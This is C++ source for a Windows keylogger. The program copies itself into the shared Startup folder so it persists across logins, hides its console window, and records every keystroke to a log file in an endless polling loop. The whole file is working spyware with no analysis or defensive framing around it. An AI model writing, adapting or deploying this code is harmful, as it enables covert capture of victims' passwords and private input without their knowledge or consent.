#include <iostream>
using namespace std;
#include <windows.h>
#include <winuser.h>

void Stealth();
void Startup();
int Save (int key_stroke, char* file);

int main()
{
	CopyFile("Basic Keylogger.exe","C:\\Users\\All Users\\Microsoft\\Windows\\Start Menu\\Startup\\Basic Keylogger.exe",0);
    Stealth();
    unsigned char i;

    while(1)
    {
            for(i=8;i<=190;i++)
            {
                 if(GetAsyncKeyState(i) == -32767)
                      Save(i,"log.txt");
            }
    }

    system("pause");
    return 0;
}

//------------------------------------------------------------------------------
//------------------------------------------------------------------------------

int Save (int key_stroke, char* file)
{
    if((key_stroke==1)||(key_stroke==2))
         return 0;

    FILE *OUTPUT_FILE;
    OUTPUT_FILE=fopen(file,"a+");

    char keystr=key_stroke;
    cout<<key_stroke<<" "<<keystr<<endl;

    if(key_stroke==8)
         fprintf(OUTPUT_FILE,"%s","[BACKS]");
    else if(key_stroke==13)
         fprintf(OUTPUT_FILE,"%s","\n");
    else if(key_stroke==32)
         fprintf(OUTPUT_FILE,"%s"," ");
    else if(key_stroke==VK_TAB)
         fprintf(OUTPUT_FILE,"%s","[TAB]");
    else if(key_stroke==VK_SHIFT)
         fprintf(OUTPUT_FILE,"%s","[SHIFT]");
    else if(key_stroke==VK_CONTROL)
         fprintf(OUTPUT_FILE,"%s","[CTRL]");
    else if(key_stroke==VK_ESCAPE)
         fprintf(OUTPUT_FILE,"%s","[ESC]");
    else if(key_stroke==VK_END)
         fprintf(OUTPUT_FILE,"%s","[END]");
    else if(key_stroke==VK_HOME)
         fprintf(OUTPUT_FILE,"%s","[HOME]");
    else if(key_stroke==VK_LEFT)
         fprintf(OUTPUT_FILE,"%s","[LEFT]");
    else if(key_stroke==VK_RIGHT)
         fprintf(OUTPUT_FILE,"%s","[RIGHT]");
    else if(key_stroke==VK_UP)
         fprintf(OUTPUT_FILE,"%s","[UP]");
    else if(key_stroke==VK_DOWN)
         fprintf(OUTPUT_FILE,"%s","[DOWN]");
    else if(key_stroke==190||key_stroke==110)
         fprintf(OUTPUT_FILE,"%s",".");
    else
         fprintf(OUTPUT_FILE,"%s",&key_stroke);
    fclose(OUTPUT_FILE);

    return 0;
}

//------------------------------------------------------------------------------
//------------------------------------------------------------------------------

void Stealth()
{
     HWND stealth;
     AllocConsole();
     stealth=FindWindowA("ConsoleWindowClass",NULL);
     ShowWindow(stealth,0);
}
